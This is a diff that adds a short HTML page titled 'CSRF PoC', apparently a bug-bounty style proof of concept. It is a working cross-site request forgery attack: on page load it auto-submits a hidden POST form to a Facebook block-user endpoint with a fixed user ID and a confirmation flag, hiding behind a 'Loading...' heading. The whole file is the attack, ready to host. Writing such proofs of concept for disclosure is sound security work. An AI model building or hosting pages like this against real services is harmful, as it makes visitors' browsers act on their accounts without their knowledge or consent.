@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF PoC</title>
+</head>
+<body onload="document.forms[0].submit();">
+  <h1>Loading...</h1>
+  <form action="https://www.facebook.com/privacy/block_user/" method="POST">
+    <input type="hidden" name="uid" value="61574665876206">
+    <input type="hidden" name="confirm" value="1">
+  </form>
+</body>
+</html>
